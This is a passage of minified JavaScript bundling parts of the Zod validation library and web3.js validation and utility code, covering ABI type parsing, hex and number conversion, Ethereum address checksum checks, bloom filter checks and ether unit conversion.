        catchValue: typeof e.catch == "function" ? e.catch : () => e.catch,
        ...Oe(e)
    });
    class cd extends Me {
        _parse(e) {
            if (this._getType(e) !== fe.nan) {
                const s = this._getOrReturnCtx(e);
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.nan,
                    received: s.parsedType
                }),
                xe
            }
            return {
                status: "valid",
                value: e.data
            }
        }
    }
    cd.create = t => new cd({
        typeName: Se.ZodNaN,
        ...Oe(t)
    });
    const NB = Symbol("zod_brand");
    class Kp extends Me {
        _parse(e) {
            const {ctx: n} = this._processInputParams(e)
              , s = n.data;
            return this._def.type._parse({
                data: s,
                path: n.path,
                parent: n
            })
        }
        unwrap() {
            return this._def.type
        }
    }
    class rc extends Me {
        _parse(e) {
            const {status: n, ctx: s} = this._processInputParams(e);
            if (s.common.async)
                return (async () => {
                    const l = await this._def.in._parseAsync({
                        data: s.data,
                        path: s.path,
                        parent: s
                    });
                    return l.status === "aborted" ? xe : l.status === "dirty" ? (n.dirty(),
                    La(l.value)) : this._def.out._parseAsync({
                        data: l.value,
                        path: s.path,
                        parent: s
                    })
                }
                )();
            {
                const o = this._def.in._parseSync({
                    data: s.data,
                    path: s.path,
                    parent: s
                });
                return o.status === "aborted" ? xe : o.status === "dirty" ? (n.dirty(),
                {
                    status: "dirty",
                    value: o.value
                }) : this._def.out._parseSync({
                    data: o.value,
                    path: s.path,
                    parent: s
                })
            }
        }
        static create(e, n) {
            return new rc({
                in: e,
                out: n,
                typeName: Se.ZodPipeline
            })
        }
    }
    class zl extends Me {
        _parse(e) {
            const n = this._def.innerType._parse(e)
              , s = o => (Rs(o) && (o.value = Object.freeze(o.value)),
            o);
            return Cl(n) ? n.then(o => s(o)) : s(n)
        }
        unwrap() {
            return this._def.innerType
        }
    }
    zl.create = (t, e) => new zl({
        innerType: t,
        typeName: Se.ZodReadonly,
        ...Oe(e)
    });
    function fA(t, e) {
        const n = typeof t == "function" ? t(e) : typeof t == "string" ? {
            message: t
        } : t;
        return typeof n == "string" ? {
            message: n
        } : n
    }
    function H1(t, e={}, n) {
        return t ? Qa.create().superRefine( (s, o) => {
            const l = t(s);
            if (l instanceof Promise)
                return l.then(u => {
                    if (!u) {
                        const d = fA(e, s)
                          , p = d.fatal ?? n ?? !0;
                        o.addIssue({
                            code: "custom",
                            ...d,
                            fatal: p
                        })
                    }
                }
                );
            if (!l) {
                const u = fA(e, s)
                  , d = u.fatal ?? n ?? !0;
                o.addIssue({
                    code: "custom",
                    ...u,
                    fatal: d
                })
            }
        }
        ) : Qa.create()
    }
    const MB = {
        object: gt.lazycreate
    };
    var Se;
    (function(t) {
        t.ZodString = "ZodString",
        t.ZodNumber = "ZodNumber",
        t.ZodNaN = "ZodNaN",
        t.ZodBigInt = "ZodBigInt",
        t.ZodBoolean = "ZodBoolean",
        t.ZodDate = "ZodDate",
        t.ZodSymbol = "ZodSymbol",
        t.ZodUndefined = "ZodUndefined",
        t.ZodNull = "ZodNull",
        t.ZodAny = "ZodAny",
        t.ZodUnknown = "ZodUnknown",
        t.ZodNever = "ZodNever",
        t.ZodVoid = "ZodVoid",
        t.ZodArray = "ZodArray",
        t.ZodObject = "ZodObject",
        t.ZodUnion = "ZodUnion",
        t.ZodDiscriminatedUnion = "ZodDiscriminatedUnion",
        t.ZodIntersection = "ZodIntersection",
        t.ZodTuple = "ZodTuple",
        t.ZodRecord = "ZodRecord",
        t.ZodMap = "ZodMap",
        t.ZodSet = "ZodSet",
        t.ZodFunction = "ZodFunction",
        t.ZodLazy = "ZodLazy",
        t.ZodLiteral = "ZodLiteral",
        t.ZodEnum = "ZodEnum",
        t.ZodEffects = "ZodEffects",
        t.ZodNativeEnum = "ZodNativeEnum",
        t.ZodOptional = "ZodOptional",
        t.ZodNullable = "ZodNullable",
        t.ZodDefault = "ZodDefault",
        t.ZodCatch = "ZodCatch",
        t.ZodPromise = "ZodPromise",
        t.ZodBranded = "ZodBranded",
        t.ZodPipeline = "ZodPipeline",
        t.ZodReadonly = "ZodReadonly"
    }
    )(Se || (Se = {}));
    const DB = (t, e={
        message: `Input not instance of ${t.name}`
    }) => H1(n => n instanceof t, e)
      , z1 = ei.create
      , G1 = Pr.create
      , LB = cd.create
      , UB = Hr.create
      , q1 = Il.create
      , jB = Bs.create
      , PB = ad.create
      , HB = kl.create
      , zB = Ol.create
      , op = Qa.create
      , GB = ws.create
      , qB = tr.create
      , FB = od.create
      , F1 = ti.create
      , Mu = gt.create
      , QB = gt.strictCreate
      , Q1 = Nl.create
      , VB = Ud.create
      , YB = Ml.create
      , V1 = bi.create
      , ZB = Dl.create
      , KB = ld.create
      , XB = Cs.create
      , JB = Pa.create
      , $B = Ll.create
      , WB = Ul.create
      , eC = zr.create
      , tC = jl.create
      , nC = Va.create
      , hA = ni.create
      , iC = yi.create
      , rC = Gr.create
      , sC = ni.createWithPreprocess
      , aC = rc.create
      , oC = () => z1().optional()
      , lC = () => G1().optional()
      , cC = () => q1().optional()
      , uC = {
        string: t => ei.create({
            ...t,
            coerce: !0
        }),
        number: t => Pr.create({
            ...t,
            coerce: !0
        }),
        boolean: t => Il.create({
            ...t,
            coerce: !0
        }),
        bigint: t => Hr.create({
            ...t,
            coerce: !0
        }),
        date: t => Bs.create({
            ...t,
            coerce: !0
        })
    }
      , dC = xe
      , mA = Object.freeze(Object.defineProperty({
        __proto__: null,
        BRAND: NB,
        DIRTY: La,
        EMPTY_PATH: dB,
        INVALID: xe,
        NEVER: dC,
        OK: tn,
        ParseStatus: Zt,
        Schema: Me,
        ZodAny: Qa,
        ZodArray: ti,
        ZodBigInt: Hr,
        ZodBoolean: Il,
        ZodBranded: Kp,
        ZodCatch: Hl,
        ZodDate: Bs,
        ZodDefault: Pl,
        ZodDiscriminatedUnion: Ud,
        ZodEffects: ni,
        ZodEnum: zr,
        ZodError: xn,
        get ZodFirstPartyTypeKind() {
            return Se
        },
        ZodFunction: Pa,
        ZodIntersection: Ml,
        ZodIssueCode: te,
        ZodLazy: Ll,
        ZodLiteral: Ul,
        ZodMap: ld,
        ZodNaN: cd,
        ZodNativeEnum: jl,
        ZodNever: tr,
        ZodNull: Ol,
        ZodNullable: Gr,
        ZodNumber: Pr,
        ZodObject: gt,
        ZodOptional: yi,
        ZodParsedType: fe,
        ZodPipeline: rc,
        ZodPromise: Va,
        ZodReadonly: zl,
        ZodRecord: Dl,
        ZodSchema: Me,
        ZodSet: Cs,
        ZodString: ei,
        ZodSymbol: ad,
        ZodTransformer: ni,
        ZodTuple: bi,
        ZodType: Me,
        ZodUndefined: kl,
        ZodUnion: Nl,
        ZodUnknown: ws,
        ZodVoid: od,
        addIssueToContext: ce,
        any: op,
        array: F1,
        bigint: UB,
        boolean: q1,
        coerce: uC,
        custom: H1,
        date: jB,
        datetimeRegex: j1,
        defaultErrorMap: Fa,
        discriminatedUnion: VB,
        effect: hA,
        enum: eC,
        function: JB,
        getErrorMap: rd,
        getParsedType: Zi,
        instanceof: DB,
        intersection: YB,
        isAborted: rp,
        isAsync: Cl,
        isDirty: sp,
        isValid: Rs,
        late: MB,
        lazy: $B,
        literal: WB,
        makeIssue: sd,
        map: KB,
        nan: LB,
        nativeEnum: tC,
        never: qB,
        null: zB,
        nullable: rC,
        number: G1,
        object: Mu,
        get objectUtil() {
            return ip
        },
        oboolean: cC,
        onumber: lC,
        optional: iC,
        ostring: oC,
        pipeline: aC,
        preprocess: sC,
        promise: nC,
        quotelessJson: cB,
        record: ZB,
        set: XB,
        setErrorMap: uB,
        strictObject: QB,
        string: z1,
        symbol: PB,
        transformer: hA,
        tuple: V1,
        undefined: HB,
        union: Q1,
        unknown: GB,
        get util() {
            return Qe
        },
        void: FB
    }, Symbol.toStringTag, {
        value: "Module"
    }))
      , fC = t => t.message ? t.message : "unspecified error";
    class Ya extends Re {
        constructor(e) {
            super(),
            this.code = NT,
            this.errors = e,
            super.message = `Web3 validator found ${e.length} error[s]:
${this._compileErrors().join(`
`)}`
        }
        _compileErrors() {
            return this.errors.map(fC)
        }
    }
    const hC = ["bool", "int", "uint", "bytes", "string", "address", "tuple"]
      , Y1 = t => typeof t == "object" && "type"in t && "name"in t
      , Xp = t => typeof t == "string"
      , Ke = t => typeof t == "string" && /^((-)?0x[0-9a-f]+|(0x))$/i.test(t);
    function Z1(t, e) {
        return !(typeof t != "string" || !t.match(/^0x[0-9A-Fa-f]*$/))
    }
    const ud = t => typeof t == "number" || typeof t == "bigint" || typeof t == "string" && /^((-0x|0x|-)?[0-9a-f]+|(0x))$/i.test(t);
    function Jp(t) {
        if (typeof t != "string")
            throw new Error(`[isHexPrefixed] input must be type 'string', received type ${typeof t}`);
        return t.startsWith("0x")
    }
    const $p = function(t) {
        for (const [e,n] of Object.entries(t))
            if (n !== void 0 && n.length > 0 && n[0] === 0)
                throw new Error(`${e} cannot have leading zeroes, received: ${n.toString()}`)
    }
      , mC = ["hex", "number", "blockNumber", "blockNumberOrTag", "filter", "bloom"]
      , Ls = t => {
        let e = t.replace(/ /, ""), n, s = !1, o = [];
        if (t.includes("[") && (e = e.slice(0, e.indexOf("[")),
        o = [...t.matchAll(/(?:\[(\d*)\])/g)].map(l => parseInt(l[1], 10)).map(l => Number.isNaN(l) ? -1 : l),
        s = o.length > 0),
        hC.includes(e))
            return {
                baseType: e,
                isArray: s,
                baseTypeSize: n,
                arraySizes: o
            };
        if (e.startsWith("int"))
            n = parseInt(e.substring(3), 10),
            e = "int";
        else if (e.startsWith("uint"))
            n = parseInt(t.substring(4), 10),
            e = "uint";
        else if (e.startsWith("bytes"))
            n = parseInt(e.substring(5), 10),
            e = "bytes";
        else
            return {
                baseType: void 0,
                isArray: !1,
                baseTypeSize: void 0,
                arraySizes: o
            };
        return {
            baseType: e,
            isArray: s,
            baseTypeSize: n,
            arraySizes: o
        }
    }
      , Im = (t, e={}) => {
        if (Object.keys(e).includes("type"))
            throw new Ya([{
                keyword: "eth",
                message: 'Either "eth" or "type" can be presented in schema',
                params: {
                    eth: t
                },
                instancePath: "",
                schemaPath: ""
            }]);
        const {baseType: s, baseTypeSize: o} = Ls(t);
        if (!s && !mC.includes(t))
            throw new Ya([{
                keyword: "eth",
                message: `Eth data type "${t}" is not valid`,
                params: {
                    eth: t
                },
                instancePath: "",
                schemaPath: ""
            }]);
        if (s) {
            if (s === "tuple")
                throw new Error('"tuple" type is not implemented directly.');
            return {
                format: `${s}${o ?? ""}`,
                required: !0
            }
        }
        return t ? {
            format: t,
            required: !0
        } : {}
    }
      , dd = (t, e="/0") => {
        const n = {
            type: "array",
            items: [],
            maxItems: t.length,
            minItems: t.length
        };
        for (const [s,o] of t.entries()) {
            let l, u, d = [];
            Y1(o) ? (l = o.type,
            u = o.name || `${e}/${s}`,
            d = o.components) : typeof o == "string" ? (l = o,
            u = `${e}/${s}`) : Array.isArray(o) && (o[0] && typeof o[0] == "string" && o[0].startsWith("tuple") && !Array.isArray(o[0]) && o[1] && Array.isArray(o[1]) ? (l = o[0],
            u = `${e}/${s}`,
            d = o[1]) : (l = "tuple",
            u = `${e}/${s}`,
            d = o));
            const {baseType: p, isArray: h, arraySizes: m} = Ls(l);
            let y, w = n;
            for (let E = m.length - 1; E > 0; E -= 1)
                y = {
                    type: "array",
                    $id: u,
                    items: [],
                    maxItems: m[E],
                    minItems: m[E]
                },
                m[E] < 0 && (delete y.maxItems,
                delete y.minItems),
                Array.isArray(w.items) ? w.items.length === 0 ? w.items = [y] : w.items.push(y) : w.items = [w.items, y],
                w = y;
            if (p === "tuple" && !h) {
                const E = dd(d, u);
                E.$id = u,
                w.items.push(E)
            } else if (p === "tuple" && h) {
                const E = m[0]
                  , S = Object.assign({
                    type: "array",
                    $id: u,
                    items: dd(d, u)
                }, E >= 0 && {
                    minItems: E,
                    maxItems: E
                });
                w.items.push(S)
            } else if (h) {
                const E = m[0]
                  , S = Object.assign({
                    type: "array",
                    $id: u,
                    items: Im(l)
                }, E >= 0 && {
                    minItems: E,
                    maxItems: E
                });
                w.items.push(S)
            } else
                Array.isArray(w.items) ? w.items.push(Object.assign({
                    $id: u
                }, Im(l))) : w.items.push(Object.assign({
                    $id: u
                }, Im(l)));
            w = n
        }
        return n
    }
      , Wp = t => dd(t)
      , e0 = (t, e) => e === 1 ? t : e0(t[0], e - 1)
      , Tl = (t, e, n) => {
        const s = [];
        for (const [o,l] of t.entries()) {
            let u, d, p = [];
            Y1(l) ? (u = l.type,
            d = l.name,
            p = l.components) : typeof l == "string" ? u = l : Array.isArray(l) && (l[1] && Array.isArray(l[1]) ? (u = l[0],
            p = l[1]) : (u = "tuple",
            p = l));
            const {baseType: h, isArray: m, arraySizes: y} = Ls(u)
              , w = Array.isArray(e) ? e[o] : e[d];
            if (h === "tuple" && !m)
                s.push(Tl(p, w, n));
            else if (h === "tuple" && m) {
                const E = [];
                for (const S of w)
                    if (y.length > 1) {
                        const _ = e0(S, y.length - 1)
                          , x = [];
                        for (const b of _)
                            x.push(Tl(p, b, n));
                        E.push(x)
                    } else
                        E.push(Tl(p, S, n));
                s.push(E)
            } else
                s.push(w)
        }
        return n = n ?? [],
        n.push(...s),
        n
    }
      , K1 = t => {
        if (t >= 48 && t <= 57)
            return t - 48;
        if (t >= 65 && t <= 70)
            return t - 55;
        if (t >= 97 && t <= 102)
            return t - 87;
        throw new Error(`Invalid code point: ${t}`)
    }
      , jd = t => {
        if (!Ke(t))
            throw new Error("Invalid hex string");
        const [e,n] = t.startsWith("-") ? [!0, t.slice(1)] : [!1, t]
          , s = BigInt(n);
        return s > Number.MAX_SAFE_INTEGER ? e ? -s : s : s < Number.MIN_SAFE_INTEGER ? s : e ? -1 * Number(s) : Number(s)
    }
      , Pd = t => {
        if ((typeof t == "number" || typeof t == "bigint") && t < 0)
            return `-0x${t.toString(16).slice(1)}`;
        if ((typeof t == "number" || typeof t == "bigint") && t >= 0)
            return `0x${t.toString(16)}`;
        if (typeof t == "string" && Ke(t)) {
            const [e,n] = t.startsWith("-") ? [!0, t.slice(1)] : [!1, t]
              , s = n.split(/^(-)?0(x|X)/).slice(-1)[0];
            return `${e ? "-" : ""}0x${s.replace(/^0+/, "").toLowerCase()}`
        }
        if (typeof t == "string" && !Ke(t))
            return Pd(BigInt(t));
        throw new Gp(t)
    }
      , fd = (t, e, n="0") => {
        if (typeof t == "string" && !Ke(t))
            return t.padStart(e, n);
        const s = typeof t == "string" && Ke(t) ? t : Pd(t)
          , [o,l] = s.startsWith("-") ? ["-0x", s.slice(3)] : ["0x", s.slice(2)];
        return `${o}${l.padStart(e, n)}`
    }
    ;
    function sr(t) {
        let e = "0x";
        for (const n of t) {
            const s = n.toString(16);
            e += s.length === 1 ? `0${s}` : s
        }
        return e
    }
    const Gi = {
        zero: 48,
        nine: 57,
        A: 65,
        F: 70,
        a: 97,
        f: 102
    };
    function pA(t) {
        if (t >= Gi.zero && t <= Gi.nine)
            return t - Gi.zero;
        if (t >= Gi.A && t <= Gi.F)
            return t - (Gi.A - 10);
        if (t >= Gi.a && t <= Gi.f)
            return t - (Gi.a - 10)
    }
    function Us(t) {
        let e = 0;
        if (t.startsWith("0") && (t[1] === "x" || t[1] === "X") && (e = 2),
        t.length % 2 !== 0)
            throw new ja(`hex string has odd length: ${t}`);
        const n = (t.length - e) / 2
          , s = new Uint8Array(n);
        for (let o = 0, l = e; o < n; o += 1) {
            const u = pA(t.charCodeAt(l++))
              , d = pA(t.charCodeAt(l++));
            if (u === void 0 || d === void 0)
                throw new ja(`Invalid byte sequence ("${t[l - 2]}${t[l - 1]}" in "${t}").`);
            s[o] = u * 16 + d
        }
        return s
    }
    function Hd(t) {
        var e;
        return !(t instanceof Uint8Array) && ((e = t?.constructor) === null || e === void 0 ? void 0 : e.name) === "Uint8Array" ? Uint8Array.from(t) : t
    }
    const X1 = Object.freeze(Object.defineProperty({
        __proto__: null,
        abiSchemaToJsonSchema: dd,
        codePointToInt: K1,
        ensureIfUint8Array: Hd,
        ethAbiToJsonSchema: Wp,
        fetchArrayElement: e0,
        hexToNumber: jd,
        hexToUint8Array: Us,
        numberToHex: Pd,
        padLeft: fd,
        parseBaseType: Ls,
        transformJsonDataToAbiFormat: Tl,
        uint8ArrayToHexString: sr
    }, Symbol.toStringTag, {
        value: "Module"
    }))
      , lp = t => {
        var e, n;
        return t instanceof Uint8Array || ((e = t?.constructor) === null || e === void 0 ? void 0 : e.name) === "Uint8Array" || ((n = t?.constructor) === null || n === void 0 ? void 0 : n.name) === "Buffer"
    }
      , Fr = (t, e={
        abiType: "bytes"
    }) => {
        if (typeof t != "string" && !Array.isArray(t) && !lp(t) || typeof t == "string" && Ke(t) && t.startsWith("-") || typeof t == "string" && !Ke(t))
            return !1;
        let n;
        if (typeof t == "string") {
            if (t.length % 2 !== 0)
                return !1;
            n = Us(t)
        } else if (Array.isArray(t)) {
            if (t.some(s => s < 0 || s > 255 || !Number.isInteger(s)))
                return !1;
            n = new Uint8Array(t)
        } else
            n = t;
        if (e?.abiType) {
            const {baseTypeSize: s} = Ls(e.abiType);
            return s ? n.length === s : !0
        }
        return e?.size ? n.length === e?.size : !0
    }
      , J1 = t => {
        if (!/^(0x)?[0-9a-f]{40}$/i.test(t))
            return !1;
        const e = t.slice(2)
          , n = Ga(e.toLowerCase())
          , s = sr(Jt(Hd(n))).slice(2);
        for (let o = 0; o < 40; o += 1)
            if (parseInt(s[o], 16) > 7 && e[o].toUpperCase() !== e[o] || parseInt(s[o], 16) <= 7 && e[o].toLowerCase() !== e[o])
                return !1;
        return !0
    }
      , Sn = (t, e=!0) => {
        if (typeof t != "string" && !lp(t))
            return !1;
        let n;
        return lp(t) ? n = sr(t) : typeof t == "string" && !Ke(t) ? n = t.toLowerCase().startsWith("0x") ? t : `0x${t}` : n = t,
        /^(0x)?[0-9a-f]{40}$/i.test(n) ? /^(0x|0X)?[0-9a-f]{40}$/.test(n) || /^(0x|0X)?[0-9A-F]{40}$/.test(n) ? !0 : e ? J1(n) : !0 : !1
    }
      , Is = (t, e) => {
        if (e === BigInt(0))
            return BigInt(1);
        let n = t;
        for (let s = 1; s < e; s += 1)
            n *= t;
        return n
    }
      , nr = (t, e={
        abiType: "uint"
    }) => {
        if (!["number", "string", "bigint"].includes(typeof t) || typeof t == "string" && t.length === 0)
            return !1;
        let n;
        if (e?.abiType) {
            const {baseTypeSize: o} = Ls(e.abiType);
            o && (n = o)
        } else
            e.bitSize && (n = e.bitSize);
        const s = Is(BigInt(2), BigInt(n ?? 256)) - BigInt(1);
        try {
            const o = typeof t == "string" && Ke(t) ? BigInt(jd(t)) : BigInt(t);
            return o >= 0 && o <= s
        } catch {
            return !1
        }
    }
      , Gl = (t, e={
        abiType: "int"
    }) => {
        if (!["number", "string", "bigint"].includes(typeof t) || typeof t == "number" && t > Number.MAX_SAFE_INTEGER)
            return !1;
        let n;
        if (e?.abiType) {
            const {baseTypeSize: l, baseType: u} = Ls(e.abiType);
            if (u !== "int")
                return !1;
            l && (n = l)
        } else
            e.bitSize && (n = e.bitSize);
        const s = Is(BigInt(2), BigInt((n ?? 256) - 1))
          , o = BigInt(-1) * Is(BigInt(2), BigInt((n ?? 256) - 1));
        try {
            const l = typeof t == "string" && Ke(t) ? BigInt(jd(t)) : BigInt(t);
            return l >= o && l <= s
        } catch {
            return !1
        }
    }
      , $1 = t => !!(Gl(t) || typeof t == "string" && /[0-9.]/.test(t) && t.indexOf(".") === t.lastIndexOf(".") || typeof t == "number")
      , W1 = t => nr(t)
      , jt = t => Object.values(Xi).includes(t)
      , cp = t => jt(t) || W1(t)
      , oo = t => typeof t != "string" || !/^(0x)?[0-9a-f]{512}$/i.test(t) ? !1 : !!(/^(0x)?[0-9a-f]{512}$/.test(t) || /^(0x)?[0-9A-F]{512}$/.test(t))
      , zd = (t, e) => {
        if (typeof e == "string" && !Ke(e) || !oo(t))
            return !1;
        const n = typeof e == "string" ? Us(e) : e
          , s = sr(Jt(n)).slice(2);
        for (let o = 0; o < 12; o += 4) {
            const l = (parseInt(s.slice(o, o + 2), 16) << 8) + parseInt(s.slice(o + 2, o + 4), 16) & 2047
              , u = K1(t.charCodeAt(t.length - 1 - Math.floor(l / 4)))
              , d = 1 << l % 4;
            if ((u & d) !== d)
                return !1
        }
        return !0
    }
      , pC = (t, e) => {
        if (!oo(t) || !Sn(e))
            return !1;
        const n = fd(e, 64);
        return zd(t, n)
    }
      , gC = (t, e) => !oo(t) || !Sn(e) ? !1 : zd(t, e)
      , yC = t => ["number", "string", "boolean"].includes(typeof t) ? typeof t == "boolean" ? !0 : typeof t == "string" && !Ke(t) ? t === "1" || t === "0" : typeof t == "string" && Ke(t) ? t === "0x1" || t === "0x0" : t === 1 || t === 0 : !1
      , q = t => t == null
      , Za = t => typeof t == "object" && !q(t) && !Array.isArray(t) && !(t instanceof Hp)
      , hd = t => typeof t != "string" || !/^(0x)?[0-9a-f]{64}$/i.test(t) ? !1 : !!(/^(0x)?[0-9a-f]{64}$/.test(t) || /^(0x)?[0-9A-F]{64}$/.test(t))
      , vC = (t, e) => !oo(t) || !hd(e) ? !1 : zd(t, e)
      , bC = t => {
        const e = ["fromBlock", "toBlock", "address", "topics", "blockHash"];
        if (q(t) || typeof t != "object" || !Object.keys(t).every(n => e.includes(n)) || !q(t.fromBlock) && !cp(t.fromBlock) || !q(t.toBlock) && !cp(t.toBlock))
            return !1;
        if (!q(t.address)) {
            if (Array.isArray(t.address)) {
                if (!t.address.every(n => Sn(n)))
                    return !1
            } else if (!Sn(t.address))
                return !1
        }
        return !(!q(t.topics) && !t.topics.every(n => q(n) ? !0 : Array.isArray(n) ? n.every(s => hd(s)) : !!hd(n)))
    }
      , ks = {
        address: t => Sn(t),
        bloom: t => oo(t),
        blockNumber: t => W1(t),
        blockTag: t => jt(t),
        blockNumberOrTag: t => cp(t),
        bool: t => yC(t),
        bytes: t => Fr(t),
        filter: t => bC(t),
        hex: t => Ke(t),
        uint: t => nr(t),
        int: t => Gl(t),
        number: t => $1(t),
        string: t => Xp(t)
    };
    for (let t = 8; t <= 256; t += 8)
        ks[`int${t}`] = e => Gl(e, {
            bitSize: t
        }),
        ks[`uint${t}`] = e => nr(e, {
            bitSize: t
        });
    for (let t = 1; t <= 32; t += 1)
        ks[`bytes${t}`] = e => Fr(e, {
            size: t
        });
    ks.bytes256 = ks.bytes;
    const wl = t => {
        if ((!t?.type || t?.type === "object") && t?.properties) {
            const e = {};
            for (const n of Object.keys(t.properties)) {
                const s = wl(t.properties[n]);
                s && (e[n] = s)
            }
            return Array.isArray(t.required) ? Mu(e).partial().required(t.required.reduce( (n, s) => Object.assign(Object.assign({}, n), {
                [s]: !0
            }), {})) : Mu(e).partial()
        }
        if (t?.type === "array" && t?.items) {
            if (Array.isArray(t.items) && t.items.length > 1 && t.maxItems !== void 0 && new Set(t.items.map(s => s.$id)).size === t.items.length) {
                const s = [];
                for (const o of t.items) {
                    const l = wl(o);
                    l && s.push(l)
                }
                return V1(s)
            }
            const e = Array.isArray(t.items) ? t.items[0] : t.items;
            let n = F1(wl(e));
            return n = t.minItems !== void 0 ? n.min(t.minItems) : n,
            n = t.maxItems !== void 0 ? n.max(t.maxItems) : n,
            n
        }
        if (t.oneOf && Array.isArray(t.oneOf))
            return Q1(t.oneOf.map(e => wl(e)));
        if (t?.format) {
            if (!ks[t.format])
                throw new zR(t.format);
            return op().refine(ks[t.format], e => ({
                params: {
                    value: e,
                    format: t.format
                }
            }))
        }
        return t?.type && t?.type !== "object" && typeof mA[String(t.type)] == "function" ? mA[String(t.type)]() : Mu({
            data: op()
        }).partial()
    }
    ;
    class Ua {
        static factory() {
            return Ua.validatorInstance || (Ua.validatorInstance = new Ua),
            Ua.validatorInstance
        }
        validate(e, n, s) {
            var o, l;
            const d = wl(e).safeParse(n);
            if (!d.success) {
                const p = this.convertErrors((l = (o = d.error) === null || o === void 0 ? void 0 : o.issues) !== null && l !== void 0 ? l : []);
                if (p) {
                    if (s?.silent)
                        return p;
                    throw new Ya(p)
                }
            }
        }
        convertErrors(e) {
            if (e && Array.isArray(e) && e.length > 0)
                return e.map(n => {
                    var s;
                    let o, l, u, d;
                    d = n.path.join("/");
                    const p = String(n.path[n.path.length - 1])
                      , h = n.path.join("/");
                    if (n.code === te.too_big)
                        l = "maxItems",
                        d = `${h}/maxItems`,
                        u = {
                            limit: n.maximum
                        },
                        o = `must NOT have more than ${n.maximum} items`;
                    else if (n.code === te.too_small)
                        l = "minItems",
                        d = `${h}/minItems`,
                        u = {
                            limit: n.minimum
                        },
                        o = `must NOT have fewer than ${n.minimum} items`;
                    else if (n.code === te.custom) {
                        const {value: m, format: y} = (s = n.params) !== null && s !== void 0 ? s : {};
                        typeof m > "u" ? o = `value at "/${d}" is required` : o = `value "${typeof m == "object" ? JSON.stringify(m) : m}" at "/${d}" must pass "${y}" validation`,
                        u = {
                            value: m
                        }
                    }
                    return {
                        keyword: l ?? p,
                        instancePath: h ? `/${h}` : "",
                        schemaPath: d ? `#${d}` : "#",
                        params: u ?? {
                            value: n.message
                        },
                        message: o ?? n.message
                    }
                }
                )
        }
    }
    class AC {
        constructor() {
            this._validator = Ua.factory()
        }
        validateJSONSchema(e, n, s) {
            return this._validator.validate(e, n, s)
        }
        validate(e, n, s={
            silent: !1
        }) {
            var o, l;
            const u = Wp(e);
            if (!(Array.isArray(u.items) && ((o = u.items) === null || o === void 0 ? void 0 : o.length) === 0 && n.length === 0)) {
                if (Array.isArray(u.items) && ((l = u.items) === null || l === void 0 ? void 0 : l.length) === 0 && n.length !== 0)
                    throw new Ya([{
                        instancePath: "/0",
                        schemaPath: "/",
                        keyword: "required",
                        message: "empty schema against data can not be validated",
                        params: n
                    }]);
                return this._validator.validate(u, n, s)
            }
        }
    }
    const Ae = new AC;
    function Qr(t) {
        var e, n;
        return t instanceof Uint8Array || ((e = t?.constructor) === null || e === void 0 ? void 0 : e.name) === "Uint8Array" || ((n = t?.constructor) === null || n === void 0 ? void 0 : n.name) === "Buffer"
    }
    function nn(...t) {
        const e = t.reduce( (o, l) => o + l.length, 0)
          , n = new Uint8Array(e);
        let s = 0;
        for (const o of t)
            n.set(o, s),
            s += o.length;
        return n
    }
    function Gd(t, e) {
        if (t === e)
            return !0;
        if (t.byteLength !== e.byteLength)
            return !1;
        for (let n = 0; n < t.byteLength; n += 1)
            if (t[n] !== e[n])
                return !1;
        return !0
    }
    const qd = {
        noether: BigInt(0),
        wei: BigInt(1),
        kwei: BigInt(1e3),
        Kwei: BigInt(1e3),
        babbage: BigInt(1e3),
        femtoether: BigInt(1e3),
        mwei: BigInt(1e6),
        Mwei: BigInt(1e6),
        lovelace: BigInt(1e6),
        picoether: BigInt(1e6),
        gwei: BigInt(1e9),
        Gwei: BigInt(1e9),
        shannon: BigInt(1e9),
        nanoether: BigInt(1e9),
        nano: BigInt(1e9),
        szabo: BigInt(1e12),
        microether: BigInt(1e12),
        micro: BigInt(1e12),
        finney: BigInt(1e15),
        milliether: BigInt(1e15),
        milli: BigInt(1e15),
        ether: BigInt("1000000000000000000"),
        kether: BigInt("1000000000000000000000"),
        grand: BigInt("1000000000000000000000"),
        mether: BigInt("1000000000000000000000000"),
        gether: BigInt("1000000000000000000000000000"),
        tether: BigInt("1000000000000000000000000000000")
    }
      , up = "Warning: Using type `number` with values that are large or contain many decimals may cause loss of precision, it is recommended to use type `string` or `BigInt` when using conversion methods"
      , Ai = t => {
        if (Ae.validate(["bytes"], [t]),
        Qr(t))
            return t;
        if (Array.isArray(t))
            return new Uint8Array(t);
        if (typeof t == "string")
            return Us(t);
        throw new ja(t)
    }
      , {uint8ArrayToHexString: wC} = X1
      , je = t => wC(Ai(t))
      , lt = t => typeof t == "string" && t.slice(0, 2).toLowerCase() !== "0x" ? Ai(`0x${t}`) : Ai(t)
      , sc = t => (Ae.validate(["hex"], [t]),
    jd(t))
      , _C = sc
      , kt = (t, e) => {
        typeof t != "bigint" && Ae.validate(["int"], [t]);
        let n = Pd(t);
        return e && (!n.startsWith("-") && n.length % 2 === 1 ? n = "0x0".concat(n.slice(2)) : n.length % 2 === 0 && n.startsWith("-") && (n = "-0x0".concat(n.slice(3)))),
        n
    }
      , EC = kt
      , xC = t => sc(t).toString()
      , ii = t => {
        Ae.validate(["string"], [t]);
        let e = t.replace(/^(?:\u0000)/, "");
        return e = e.replace(/(?:\u0000)$/, ""),
        je(new TextEncoder().encode(e))
    }
      , ew = ii
      , SC = ii
      , Fd = t => M1(lt(t))
      , TC = t => typeof t == "string" ? Fd(t) : (Ae.validate(["bytes"], [t]),
    M1(t))
      , t0 = Ga
      , RC = Fd
      , tw = t => {
        Ae.validate(["string"], [t]);
        let e = "";
        for (let n = 0; n < t.length; n += 1) {
            const s = t.charCodeAt(n).toString(16);
            e += s.length % 2 !== 0 ? `0${s}` : s
        }
        return `0x${e}`
    }
      , BC = tw
      , nw = t => new TextDecoder("ascii").decode(lt(t))
      , CC = nw
      , ir = (t, e) => {
        if (typeof t == "string" && Sn(t))
            return e ? "address" : `0x${t.toLowerCase().replace(/^0x/i, "")}`;
        if (typeof t == "boolean")
            return e ? "bool" : t ? "0x01" : "0x00";
        if (typeof t == "number")
            return e ? t < 0 ? "int256" : "uint256" : kt(t);
        if (typeof t == "bigint")
            return e ? "bigint" : kt(t);
        if (Qr(t))
            return e ? "bytes" : je(t);
        if (typeof t == "object" && t)
            return e ? "string" : ii(JSON.stringify(t));
        if (typeof t == "string") {
            if (t.startsWith("-0x") || t.startsWith("-0X"))
                return e ? "int256" : kt(t);
            if (Ke(t))
                return e ? "bytes" : t;
            if (ud(t) && !Gl(t) && !nr(t))
                return e ? "bytes" : `0x${t}`;
            if (ud(t) && !Gl(t) && nr(t))
                return e ? "uint" : kt(t);
            if (!Number.isFinite(t))
